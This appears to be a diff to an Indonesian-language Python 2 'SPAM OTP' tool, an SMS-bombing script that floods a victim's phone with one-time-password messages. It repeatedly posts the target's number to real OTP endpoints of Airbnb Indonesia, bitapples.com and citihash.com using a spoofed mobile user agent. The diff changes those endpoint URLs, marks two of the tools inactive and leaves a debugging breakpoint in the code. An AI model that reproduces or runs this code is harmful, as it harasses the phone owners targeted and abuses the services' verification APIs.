@@ -44,17 +44,17 @@ def tiks(s):
 def main():
 	banner()
 	print
-	print(C+' Diperbarui Tanggal : '+W+'11 April 2020')
+	print(C+' Diperbarui Tanggal : '+W+'14 April 2020')
 	print
 	tiks(W+50*'=')
 	tiks(C+'\tTOOLS\t\t LIMIT\t\tSTATUS')
 	tiks(W+50*'=')
 	print
-	tiks(C+'['+W+'1'+C+']'+W+' SPAM CALL V1' +W+'\t3X / 1 HARI'+W+'\tACTIVE'+H+' \xE2\x9C\x94')
+	tiks(C+'['+W+'1'+C+']'+W+' SPAM CALL V1' +W+'\t3X / 1 HARI'+M+'\tNOT ACTIVE \xE2\x9C\x96')
 	tiks(C+50*'=')
 	tiks(C+'['+W+'2'+C+']'+W+' SPAM CALL V2'+W+'\t3X / 1 HARI'+W+'\tACTIVE'+H+' \xE2\x9C\x94')
 	tiks(C+50*'=')
-	tiks(C+'['+W+'3'+C+']'+W+' SPAM CALL V3'+W+'\t3X / 1 HARI'+W+'\tACTIVE'+H+' \xE2\x9C\x94')
+	tiks(C+'['+W+'3'+C+']'+W+' SPAM CALL V3'+W+'\t3X / 1 HARI'+M+'\tNOT ACTIVE \xE2\x9C\x96')
 	tiks(C+50*'=')
 	tiks(C+'['+W+'4'+C+']'+W+' REPORT BUG'+K+'\t\t    -\t\t'+W+'ACTIVE'+H+' \xE2\x9C\x94')
 	tiks(C+50*'=')
@@ -68,6 +68,10 @@ def main():
 		pilih = raw_input(W+'Pilih Tools'+C+' : '+W+'')
 		
 		if pilih == '1':
+			print
+			print(C+' Tools Tidak Aktif'+W+' ^_^')
+			sleep(3)
+			main()
 			print
 			tiks(W+'\t\tSPAM OTP V1')
 			tiks(C+'\t\t'+12*'=')
@@ -113,7 +117,7 @@ def main():
 				Sess.headers = {'User-Agent' : 'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; 909) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537'}
 				
 				send = Sess.post('https://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=USD&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=id', json = data)
-			
+				
 				if 'error' in send.text:
 					print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(phone)+W+' GAGAL'+M+' \xE2\x9C\x96')
 				
@@ -165,7 +169,7 @@ def main():
 				Sess.cookies = Cookies
 				Sess.headers = {'User-Agent' : 'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; 909) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537'}
 				
-				send = Sess.post('https://bitapples.com/api/v1/customer/auth/requestotpwithoutauth?t=1586576496&lang=en', json = data, headers = {'User-Agent' : 'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; 909) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537'})
+				send = Sess.post('https://bitapples.com/api/v1/customer/auth/otpRequest?lang=en', json = data, headers = {'User-Agent' : 'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; 909) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537'})
 			
 				if 'Otp sent, please check your mobile.' in send.text:
 					print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(phone)+W+' BERHASIL'+H+' \xE2\x9C\x94')
@@ -176,6 +180,9 @@ def main():
 					
 		elif pilih == '3':
 			print
+			print(C+' Tools Tidak Aktif'+W+' ^_^')
+			sleep(3)
+			main()
 			tiks(W+'\t\tSPAM OTP V3')
 			tiks(C+'\t\t'+12*'=')
 			print
@@ -193,9 +200,9 @@ def main():
 				print(M+'\tNomor Tidak Valid !')
 				sys.exit()
 			
-			elif '62' in phone[0:2] or '+62' in phone[0:2] or '08' in phone[0:2]:
+			elif '62' in phone[0:2] or '+62' in phone[0:2]:
 				print
-				print(C+'\tTanpa'+W+' +62/62/08'+C+' Langsung'+W+' 812xxxx'+C+' !')
+				print(C+'\tTanpa'+W+' +62/62'+C+' Langsung'+W+' 0812xxxx'+C+' !')
 				sleep(4)
 				main()
 					
@@ -211,7 +218,7 @@ def main():
 				'contactNo' : phone,
 				'countryCode' : 'ID',
 				'requestMode' : '2',
-				'isSignup' : 'true'
+				'isSignup' : 'true' 
 				}
 				
 				Cookies = Cookie('.cookieslog','w')
@@ -219,13 +226,14 @@ def main():
 				Sess.cookies = Cookies
 				Sess.headers = {'User-Agent' : 'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; 909) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537'}
 				
-				send = Sess.post('https://citihash.com/api/v1/auth/otpRequest?lang=en', json = data, headers = {'User-Agent' : 'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; 909) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537'})
+				send = Sess.post('https://citihash.com/api/v1/auth/otp0329Request?lang=en', json = data)
 			
 				if 'Otp sent, please check your mobile.' in send.text:
 					print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(phone)+W+' BERHASIL'+H+' \xE2\x9C\x94')
 				
 				else:
 					print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(phone)+W+' GAGAL'+M+' \xE2\x9C\x96')
+					import pdb;pdb.set_trace()
 					Cookies.save()
 					
 		elif pilih == '4':
